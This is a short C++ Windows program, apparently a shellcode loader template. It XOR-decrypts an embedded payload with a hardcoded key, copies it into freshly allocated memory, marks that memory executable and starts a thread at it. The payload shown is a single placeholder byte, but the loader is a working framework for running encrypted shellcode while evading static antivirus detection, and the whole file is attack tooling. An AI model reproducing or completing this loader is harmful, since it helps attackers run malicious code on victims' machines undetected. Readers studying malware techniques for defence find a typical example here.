#include "Windows.h"
#include "stdio.h"

unsigned char* xor_encrypt(unsigned char* buffer_src, unsigned char* pass, int buf_len, int key_len) {
	key_len = key_len - 1;
	unsigned char* final = new unsigned char[buf_len];
	unsigned char key_char;

	for (int i = 0; i < buf_len; i++) {
		key_char = pass[i % key_len];
		final[i] = buffer_src[i] ^ key_char;
	}

	return final;
}


int main()
{
	unsigned char encrypted[] = "\xCC";
	int encrypted_len = sizeof(encrypted);


	unsigned char key[] = "alphaomega";
	int key_len = sizeof(key);

	unsigned char* payload = xor_encrypt(encrypted, key, encrypted_len, key_len);
	int payload_len = sizeof(encrypted);
	printf("[*] Sizeof initial payload is %d.\n", payload_len);

	LPVOID  address = (LPVOID)VirtualAlloc(0, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (address == 0) {
		printf("[*] Error allocating memory. Error: %d.\n", GetLastError());
		return -1;
	}
	printf("[*] Allocated memory in process.\n");

	RtlMoveMemory(address, payload, payload_len);
	printf("[*] Wrote memory.\n");

	DWORD oldProtection;
	BOOL protect = VirtualProtect(address, payload_len, PAGE_EXECUTE_READ, &oldProtection);
	if (protect == 0) {
		printf("[*] Error changing memory protection. Error: %d.\n", GetLastError());
		return -1;
	}

	DWORD thread_id;
	DWORD* pthreadId = &thread_id;

	HANDLE hRemoteThread = CreateThread(
		NULL, //lpthreadattributes
		(SIZE_T)1024, //dwstacksize
		(LPTHREAD_START_ROUTINE)address, //lpstartaddress
		NULL, //lpvoid lpparameter
		0,
		pthreadId
	);
	if (hRemoteThread == 0) {
		printf("[*] Error creating remote thread. Error: %d.\n", GetLastError());
		return -1;
	}
	printf("[*] New thread started.\n");
	printf("[*] Thread ID is %d.\n", thread_id);

	WaitForSingleObject(hRemoteThread, INFINITE);
	return 0;
}
